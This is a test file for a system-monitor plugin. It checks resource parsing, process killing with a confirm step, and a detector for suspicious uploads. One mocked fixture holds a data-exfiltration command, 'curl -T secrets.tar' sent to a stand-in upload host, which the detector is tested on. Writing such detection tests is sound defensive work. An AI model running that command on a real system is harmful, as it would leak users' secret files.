import { expect, mock, test } from 'claude-code/testing'
import type { On } from 'claude-code'
import type { TestBody } from 'claude-code/testing'

import { cleanupPrompt, parseDf, parseProcs, parseSample, protection } from '../hooks/model'
import { alertNotes, newTracker, parseNetstat, parseNettop, parseRemotes, parseSignature, step, VOLUME } from '../hooks/net'

const PANE = {
  plugin: 'sysmon',
  component: 'Pane',
  requestId: 'sysmon',
  props: {
    title: 'System',
    isFocused: false,
    bodyColumns: 70,
    placement: 'dock',
    scroll: { offset: 0, bodyRows: 80 },
    view: {},
  },
} as const

const BAND = {
  plugin: 'sysmon',
  component: 'AbovePrompt',
  props: { hasSurvey: false, isWorking: false, maxRows: 4, bodyColumns: 80, scroll: { offset: 0, bodyRows: 4 }, view: {} },
} as const

const NOW = Date.UTC(2026, 9, 28, 10, 0, 0)
const GiB = 1024 ** 3

// What the macOS sampling shell prints: the shell is pid 900, run by the session (pid 800).
const PS = [
  '    1     0   0.0  12000 launchd',
  '  300     1   0.0 900000 kernel_task',
  '  620     1  45.0  80000 WindowServer',
  '  700     1   2.0 400000 Claude',
  '  800   700   1.5 380000 claude',
  '  900   800   0.0   1000 sh',
  '  901   900   0.0   2000 ps',
  ' 4242     1  88.5 512000 Google Chrome Helper (Renderer)',
  ' 5555     1  12.0 2097152 node',
  ' 6000     1   0.0    800 sleep',
  ' 6100   501   3.0  20000 curl',
  ' 6200     1   1.0  90000 zoom.us',
].join('\n')

const DF = [
  'Filesystem 1024-blocks Used Available Capacity Mounted on',
  '/dev/disk3s1s1 971350180 13337964 77398248 15% /',
  'devfs 230 230 0 100% /dev',
  '/dev/disk3s6 971350180 24152096 77398248 24% /System/Volumes/VM',
  '/dev/disk3s5 971350180 843936572 77398248 92% /System/Volumes/Data',
  'map auto_home 0 0 0 100% /System/Volumes/Data/home',
  '/dev/disk3s3 971350180 1506020 77398248 2% /Volumes/Recovery',
  '/dev/disk7s1 17659904 17159516 455144 98% /Library/Developer/CoreSimulator/Volumes/iOS_23F77',
  '/dev/disk20s1 976762584 476762584 500000000 49% /Volumes/Backup Drive',
].join('\n')

const VM = `Mach Virtual Memory Statistics: (page size of 16384 bytes)
Pages free:                                    61464.
Pages active:                                 363918.
Pages wired down:                             437931.
Pages purgeable:                                 204.
Anonymous pages:                              438377.
Pages occupied by compressor:                1077005.
`

const sampleText = (idle = 66) =>
  [
    '@@self',
    '900 800',
    '@@cpu',
    `   25  9 ${idle}  3.10 3.00 2.90`,
    '@@vm',
    VM,
    '@@sysctl',
    '38654705664\n14\ntotal = 2048.00M  used = 512.00M  free = 1536.00M  (encrypted)',
    '@@ps',
    PS,
    '@@df',
    DF,
  ].join('\n')

// What the details shell prints for the uploading curl.
const DETAILS = [
  '@@path',
  '/private/tmp/x/curl',
  '@@ps',
  'budi   501 Wed Oct 28 11:43:48 2026',
  '@@args',
  'curl -T secrets.tar https://drop.example.net/upload',
  '@@parent',
  '  501 zsh',
  '@@lsof',
  'COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME',
  'curl    6100 budi    5u  IPv4 0x1      0t0  TCP 192.168.1.5:50000->203.0.113.7:443 (ESTABLISHED)',
  '@@sign',
  '/private/tmp/x/curl: code object is not signed at all',
].join('\n')

function engine(on: On) {
  const clock = mock.clock(on, { now: NOW })
  mock.store(on)
  mock.env(on, { HOME: '/Users/budi' })
  const calls = {
    clock,
    runs: [] as (readonly string[])[],
    toasts: [] as string[],
    idle: 66,
    /** Network: when set, each sample adds nettop/netstat counters that grow with the clock. */
    net: undefined as undefined | { upRate: number; idleSec: number },
    notifications: [] as string[],
    /** pid → name for `ps -p`; missing means gone. */
    alive: { 4242: 'Google Chrome Helper (Renderer)', 5555: 'node', 6100: 'curl' } as Record<number, string>,
    /** pids that ignore SIGTERM. */
    stubborn: new Set<number>(),
  }
  on('process.run', (_, e) => {
    const argv = e.argv
    calls.runs.push(argv)
    const ok = (stdout = '', exitCode = 0, stderr = '') => ({ value: { exitCode, stdout, stderr, isStdoutTruncated: false, isStderrTruncated: false } })
    if (argv[0] === 'uname') return ok('Darwin\n')
    if (argv[0] === 'sh' && String(argv[2]).includes('lsof -nP -a -p')) return ok(DETAILS)
    if (argv[0] === 'sh') {
      if (!calls.net) return ok(sampleText(calls.idle))
      const secs = (clock.now() - NOW) / 1000
      const up = Math.round(calls.net.upRate * secs)
      const zoom = Math.round(300_000 * secs) // a video call: as much in as out
      const nettop = [',bytes_in,bytes_out,', `curl.6100,${1000 + Math.round(secs * 100)},${up},`, `zoom.us.6200,${zoom},${zoom},`, 'launchd.1,0,0,'].join('\n')
      const netstat = [
        'Name       Mtu   Network       Address            Ipkts Ierrs     Ibytes    Opkts Oerrs     Obytes  Coll',
        `lo0        16384 <Link#1>                      100     0 999999 100     0 999999     0`,
        `en0        1500  <Link#11>   aa:bb:cc:dd:ee:ff 100     0 ${zoom + 5000} 100     0 ${zoom + up + 5000}     0`,
        `utun4      1280  <Link#20>                     100     0 ${up} 100     0 ${up}     0`,
      ].join('\n')
      return ok(`${sampleText(calls.idle)}\n@@nettop\n${nettop}\n@@netstat\n${netstat}\n@@idle\n${calls.net.idleSec}\n`)
    }
    if (argv[0] === 'osascript') {
      calls.notifications.push(String(argv[2]))
      return ok()
    }
    if (argv[0] === 'ps') {
      const pid = Number(argv[argv.indexOf('-p') + 1])
      const name = calls.alive[pid]
      return name ? ok(`${name}\n`) : ok('', 1)
    }
    if (argv[0] === 'kill') {
      const pid = Number(argv[2])
      if (!(pid in calls.alive)) return ok('', 1, `kill: ${pid}: No such process`)
      if (argv[1] === '-TERM' && !calls.stubborn.has(pid)) delete calls.alive[pid]
      if (argv[1] === '-KILL') delete calls.alive[pid]
      return ok()
    }
    if (argv[0] === 'open') return ok()
    return ok('', 127, 'not found')
  })
  on('command.register', () => ({ value: { command: 'sysmon' } }))
  on('ui.open', () => ({ value: { isPlaced: true } }))
  on('ui.toast', (_, e) => {
    calls.toasts.push(String(e.text))
    return { value: undefined }
  })
  on('ui.log', () => ({ value: undefined }))
  on('session.start', (_, e) => ({ cwd: e.cwd }))
  return calls
}

async function started($: Parameters<TestBody>[0], calls: ReturnType<typeof engine>) {
  await $.session.start({ cwd: '/', surface: 'desktop', isInteractive: true })
  await calls.clock.settle()
}

// ---------- parsing ----------

test('a macOS sample: CPU, RAM, processes and volumes', () => {
  const s = parseSample(sampleText(), 'darwin', NOW)
  expect(s.cpu.percent).toBe(34)
  expect(s.cpu.cores).toBe(14)
  expect(Math.round(s.mem.used / GiB)).toBe(30) // (anonymous - purgeable + wired + compressed) pages
  expect(s.mem.swapUsed).toBe(512 * 1024 * 1024)
  expect(s.topCpu[0]?.name).toBe('Google Chrome Helper (Renderer)')
  expect(s.topMem[0]?.name).toBe('node')
  expect(s.topCpu.some(p => p.name === 'sh' || p.name === 'ps'), 'the sampler is left out').toBe(false)
  expect(s.sessionPids.sort()).toEqual([700, 800])
})

test('the startup disk counts the whole APFS container; system and simulator volumes are left out', () => {
  const disks = parseDf(DF, 'darwin')
  expect(disks.map(d => d.mount)).toEqual(['/', '/Volumes/Backup Drive'])
  expect(disks[0]?.percent).toBe(92)
  expect(disks[0]?.level).toBe('warning')
  expect(disks[1]?.label).toBe('Backup Drive')
  expect(disks[1]?.level).toBe('ok')
})

test('protected processes', () => {
  const session = new Set([700, 800])
  expect(protection({ pid: 1, name: 'launchd' }, session)).toBe('system')
  expect(protection({ pid: 300, name: 'kernel_task' }, session)).toBe('system')
  expect(protection({ pid: 620, name: 'WindowServer' }, session)).toBe('system')
  expect(protection({ pid: 800, name: 'claude' }, session)).toBe('session')
  expect(protection({ pid: 999, name: 'Claude Helper (Renderer)' }, session)).toBe('app')
  expect(protection({ pid: 4242, name: 'Google Chrome Helper' }, session)).toBeUndefined()
})

test('Linux ps names keep their last path part', () => {
  expect(parseProcs('  10   1  1.0  2048 /usr/bin/python3')[0]?.name).toBe('python3')
})

// ---------- the pane ----------

test('the pane shows CPU, RAM, top processes and disks, on every surface', async ($, on) => {
  const calls = engine(on)
  await started($, calls)
  for (const surface of ['desktop', 'terminal'] as const) {
    const ui = await $.ui.mount({ ...PANE, surface })
    expect(await ui.find({ type: 'Text', text: '34%' }), 'CPU').toBeTruthy()
    expect(await ui.find({ type: 'Text', text: '83%' }), 'RAM').toBeTruthy()
    expect(await ui.find({ type: 'Text', text: /29\.8 GB of 36\.0 GB · swap 512 MB/ })).toBeTruthy()
    expect(await ui.find({ type: 'Button', key: 'kill-cpu-4242' })).toBeTruthy()
    expect(await ui.find({ type: 'Button', key: 'kill-cpu-620' }), 'WindowServer is protected').toBeUndefined()
    expect(await ui.find({ type: 'Button', key: 'kill-mem-800' }), 'this session is protected').toBeUndefined()
    expect(await ui.find({ type: 'Button', key: 'kill-mem-700' }), 'the Claude app is protected').toBeUndefined()
    expect(await ui.find({ type: 'Text', text: '🔒 this session' })).toBeTruthy()
    expect(await ui.find({ type: 'Text', text: '92% full' })).toBeTruthy()
    expect(await ui.find({ type: 'Text', text: /free of .* · running low/ })).toBeTruthy()
    expect(await ui.find({ type: 'Button', key: 'cleanup' })).toBeTruthy()
    await ui.unmount()
  }
})

test('Kill asks first, sends SIGTERM, and the process is gone', async ($, on) => {
  const calls = engine(on)
  await started($, calls)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })

  await ui.press({ key: 'kill-cpu-4242' })
  expect(calls.runs.some(a => a[0] === 'kill'), 'nothing sent before the confirm').toBe(false)
  expect(await ui.find({ type: 'Text', text: 'Kill Google Chrome Helper (Renderer) (pid 4242)?' })).toBeTruthy()

  await ui.press({ key: 'kill-cancel' })
  expect(await ui.find({ type: 'Button', key: 'kill-confirm' })).toBeUndefined()
  expect(calls.runs.some(a => a[0] === 'kill')).toBe(false)

  await ui.press({ key: 'kill-cpu-4242' })
  await ui.press({ key: 'kill-confirm' })
  await calls.clock.advance(2_500)
  expect(calls.runs.some(a => a.join(' ') === 'kill -TERM 4242')).toBe(true)
  expect(calls.runs.some(a => a.join(' ') === 'kill -KILL 4242'), 'no SIGKILL when SIGTERM worked').toBe(false)
  expect(calls.toasts.at(-1)).toBe('Ended Google Chrome Helper (Renderer) (pid 4242) with SIGTERM.')
  expect(await ui.find({ type: 'Button', key: 'kill-force' })).toBeUndefined()
  await ui.unmount()
})

test('a process that survives SIGTERM is offered SIGKILL', async ($, on) => {
  const calls = engine(on)
  calls.stubborn.add(5555)
  await started($, calls)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })

  await ui.press({ key: 'kill-mem-5555' })
  await ui.press({ key: 'kill-confirm' })
  await calls.clock.advance(2_500)
  expect(await ui.find({ type: 'Text', text: 'node (pid 5555) is still running after SIGTERM.' })).toBeTruthy()
  await ui.press({ key: 'kill-force' })
  await calls.clock.advance(1_500)
  expect(calls.runs.some(a => a.join(' ') === 'kill -KILL 5555')).toBe(true)
  expect(calls.toasts.at(-1)).toBe('Ended node (pid 5555) with SIGKILL.')
  await ui.unmount()
})

test('Kill sends nothing when the pid now names another process', async ($, on) => {
  const calls = engine(on)
  await started($, calls)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'kill-cpu-4242' })
  calls.alive[4242] = 'Finder'
  await ui.press({ key: 'kill-confirm' })
  await calls.clock.advance(2_500)
  expect(calls.runs.some(a => a[0] === 'kill')).toBe(false)
  expect(calls.toasts.at(-1)).toBe('pid 4242 is now "Finder", not Google Chrome Helper (Renderer); nothing was sent.')
  await ui.unmount()
})

test('Cleanup opens a new desktop session with the cleanup prompt', async ($, on) => {
  const calls = engine(on)
  await started($, calls)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'cleanup' })
  await calls.clock.settle()
  const open = calls.runs.find(a => a[0] === 'open')
  expect(open).toBeTruthy()
  const url = new URL(String(open?.[1]))
  expect(url.protocol).toBe('claude:')
  expect(url.host + url.pathname).toBe('code/new')
  expect(url.searchParams.get('folder')).toBe('/Users/budi')
  const prompt = url.searchParams.get('q') ?? ''
  expect(prompt).toContain('Do NOT delete')
  expect(prompt).toContain('Startup disk (/)')
  expect(prompt).toContain('bash code block')
  expect(await ui.find({ type: 'Text', text: /A new session opened with the cleanup prompt/ })).toBeTruthy()
  await ui.unmount()
})

test('the cleanup prompt never asks the new session to delete', () => {
  const p = cleanupPrompt(null, '/Users/budi')
  expect(p).toContain('Never run a command that deletes')
  expect(p).toContain('/Users/budi/Library/Caches')
})

// ---------- the band ----------

test('the band shows one line and a button that opens the pane', async ($, on) => {
  const calls = engine(on)
  calls.idle = 5 // CPU 95%: past the threshold
  on('ui.render', { component: 'AbovePrompt' }, ($, e) => {
    const { Box } = $.ui.resolve(e)
    return <Box /> // nothing else draws in the band
  })
  await started($, calls)
  const band = await $.ui.mount({ ...BAND, surface: 'desktop' })
  expect(await band.find({ type: 'Button', key: 'open-sysmon' })).toBeTruthy()
  expect((await band.find({ type: 'Text', text: /^CPU/ }))?.text).toBe('CPU 95% · RAM 83% · Disk 92%')
  // Each part is its own span, coloured past its threshold.
  const line = await band.find({ type: 'Text', text: /^CPU/ })
  const spans = (line?.children ?? []) as { props: { color?: string; dimColor?: boolean }; children: string[] }[]
  const colorOf = (t: string) => spans.find(c => c.children[0] === t)?.props
  expect(colorOf('CPU 95%')?.color).toBe('error')
  expect(colorOf('RAM 83%')?.dimColor, 'RAM is fine').toBe(true)
  expect(colorOf('Disk 92%')?.color).toBe('warning')
  await band.press({ key: 'open-sysmon' })
  await band.unmount()
})

test('polling is fast while the pane is open and slow otherwise', async ($, on) => {
  const calls = engine(on)
  const samples = () => calls.runs.filter(a => a[0] === 'sh').length
  await started($, calls)
  expect(samples()).toBe(1)
  await calls.clock.advance(10_000)
  expect(samples(), 'closed: nothing in 10 s').toBe(1)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await calls.clock.advance(10_000)
  expect(samples()).toBeGreaterThan(3)
  await ui.unmount()
})

// ---------- network ----------

const MB = 1024 * 1024
const counters = (entries: [number, string, number, number][]) => new Map(entries.map(([pid, name, i, o]) => [pid, { name, in: i, out: o }]))

test('nettop, netstat, signatures and connections are read', () => {
  const n = parseNettop(',bytes_in,bytes_out,\nCodex (Service).29036,11539362,9632302,\nio.tailscale.ip.73183,5,6,\n')
  expect(n.get(29036)).toEqual({ name: 'Codex (Service)', in: 11539362, out: 9632302 })
  expect(n.get(73183)?.name).toBe('io.tailscale.ip')
  const t = parseNetstat(
    ['Name Mtu Network Address Ipkts Ierrs Ibytes Opkts Oerrs Obytes Coll', 'lo0 16384 <Link#1> 5 0 900 5 0 900 0', 'en0 1500 <Link#11> aa:bb 5 0 1000 5 0 2000 0', 'en0 1500 192.168.1 192.168.1.5 5 - 1000 5 - 2000 -', 'utun3 1380 <Link#20> 5 0 70 5 0 80 0'].join('\n'),
  )
  expect(t).toEqual({ in: 1000, out: 2000 })
  expect(parseSignature('Identifier=com.apple.ssh\nPlatform identifier=26\nAuthority=macOS Software Signing')?.kind).toBe('apple')
  expect(parseSignature('Authority=Developer ID Application: Tailscale Inc. (W5364U7YZB)')?.text).toBe('Developer ID: Tailscale Inc. (W5364U7YZB)')
  expect(parseSignature('Identifier=node-5555\nSignature=adhoc')?.kind).toBe('adhoc')
  expect(parseSignature('/tmp/x: code object is not signed at all')?.kind).toBe('unsigned')
  expect(parseRemotes(DETAILS)).toEqual(['203.0.113.7:443'])
})

test('a steady one-sided upload trips the detector; a video call does not', () => {
  const t = newTracker()
  let at = NOW
  let last: ReturnType<typeof step> = []
  for (let i = 0; i <= 3; i++, at += 30_000) {
    const s = i * 30
    last = step(t, at, counters([[10, 'rclone', s * 1000, s * MB], [20, 'zoom.us', s * 300_000, s * 300_000]]), { in: 0, out: 0 })
  }
  expect(last.find(x => x.pid === 10)?.alertSince, 'rclone after 90 s at 1 MB/s').toBeDefined()
  expect(last.find(x => x.pid === 10)?.outRate).toBe(MB)
  expect(last.find(x => x.pid === 20)?.alertSince, 'zoom sends as much as it gets').toBeUndefined()
})

test('a large burst trips it at once, and the alert clears two minutes after the upload stops', () => {
  const t = newTracker()
  step(t, NOW, counters([[10, 'tar', 0, 0]]), { in: 0, out: 0 })
  const burst = step(t, NOW + 30_000, counters([[10, 'tar', 0, VOLUME + MB]]), { in: 0, out: 0 })
  expect(burst[0]?.alertSince).toBe(NOW + 30_000)
  // Quiet from now on: the 10-minute total still holds the burst, so it stays until the window passes it.
  let at = NOW + 30_000
  let last = burst
  while (last[0]?.alertSince !== undefined && at < NOW + 20 * 60_000) {
    at += 30_000
    last = step(t, at, counters([[10, 'tar', 0, VOLUME + MB]]), { in: 0, out: 0 })
  }
  expect(at - NOW, 'cleared after the window and the grace time').toBeLessThan(14 * 60_000)
})

test('an unsigned program uploading from /tmp while you are away is red', () => {
  const r = alertNotes({ idleSec: 600, details: { path: '/private/tmp/x/curl', remotes: [], signature: { kind: 'unsigned', text: 'Not signed' } } })
  expect(r.level).toBe('error')
  expect(r.notes.length).toBe(3)
  expect(alertNotes({ idleSec: 5, details: { path: '/Applications/Dropbox.app/Contents/MacOS/Dropbox', remotes: [], signature: { kind: 'developer', text: 'Developer ID: Dropbox' } } }).level).toBe('warning')
})

async function uploading($: Parameters<TestBody>[0], on: On) {
  const calls = engine(on)
  calls.net = { upRate: 2 * MB, idleSec: 600 }
  await started($, calls)
  await calls.clock.advance(95_000) // closed pane: a sample every 30 s
  return calls
}

test('the alert names the program, where it runs from, its signer and where it sends', async ($, on) => {
  const calls = await uploading($, on)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  expect(await ui.find({ type: 'Text', text: '⚠ curl (pid 6100) keeps uploading' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: /^Sent .* · now ↑ 2\.0 MB\/s ↓ 100 B\/s · steady for/ })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: 'You have been away 10 min while it kept sending.' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: 'It runs from a temporary or download folder.' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: '/private/tmp/x/curl' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: 'Not signed' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: 'curl -T secrets.tar https://drop.example.net/upload' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: /by zsh \(pid 501\)/ })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: '203.0.113.7:443' })).toBeTruthy()
  expect(await ui.find({ type: 'Text', text: /zoom/ }), 'the video call is listed').toBeTruthy()
  expect(await ui.find({ type: 'Text', text: '⚠ zoom.us (pid 6200) keeps uploading' }), 'but not alerted').toBeUndefined()
  // The network total skips the tunnel, which carries the same bytes again.
  expect(await ui.find({ type: 'Text', text: /^↑ 2\.[0-9] MB\/s$/ })).toBeTruthy()
  expect(calls.toasts.filter(t => t.startsWith('Unusual upload: curl')).length, 'one toast').toBe(1)
  expect(calls.notifications.length, 'one macOS notification').toBe(1)
  await ui.unmount()
})

test('Kill from an alert asks first, then ends the uploader', async ($, on) => {
  const calls = await uploading($, on)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'net-kill-6100' })
  expect(calls.runs.some(a => a[0] === 'kill')).toBe(false)
  expect(await ui.find({ type: 'Text', text: 'Kill curl (pid 6100)?' })).toBeTruthy()
  await ui.press({ key: 'kill-confirm' })
  await calls.clock.advance(2_500)
  expect(calls.runs.some(a => a.join(' ') === 'kill -TERM 6100')).toBe(true)
  expect(calls.toasts.at(-1)).toBe('Ended curl (pid 6100) with SIGTERM.')
  await ui.unmount()
})

test('Ignore hides the alert for good, shared through the store; Unignore brings it back', async ($, on) => {
  const calls = await uploading($, on)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'net-ignore-6100' })
  expect(await ui.find({ type: 'Text', text: /keeps uploading/ })).toBeUndefined()
  await calls.clock.advance(10_000)
  expect(await ui.find({ type: 'Text', text: /keeps uploading/ }), 'still hidden after new readings').toBeUndefined()
  await ui.press({ key: 'net-show-ignored' })
  expect(await ui.find({ type: 'Text', text: 'curl · /private/tmp/x/curl' })).toBeTruthy()
  await ui.press({ key: 'net-unignore-/private/tmp/x/curl' })
  await calls.clock.advance(4_000)
  expect(await ui.find({ type: 'Text', text: /curl \(pid 6100\) keeps uploading/ })).toBeTruthy()
  await ui.unmount()
})

test('the band flags the upload in red', async ($, on) => {
  on('ui.render', { component: 'AbovePrompt' }, ($, e) => {
    const { Box } = $.ui.resolve(e)
    return <Box />
  })
  const calls = await uploading($, on)
  const band = await $.ui.mount({ ...BAND, surface: 'desktop' })
  const line = await band.find({ type: 'Text', text: /^CPU/ })
  const spans = (line?.children ?? []) as { props: { color?: string }; children: string[] }[]
  const alert = spans.find(c => String(c.children[0]).startsWith('⚠ Upload'))
  expect(alert?.children[0]).toBe('⚠ Upload: curl 2.0 MB/s')
  expect(alert?.props.color).toBe('error')
  expect(calls.notifications.length).toBe(1)
  await band.unmount()
})
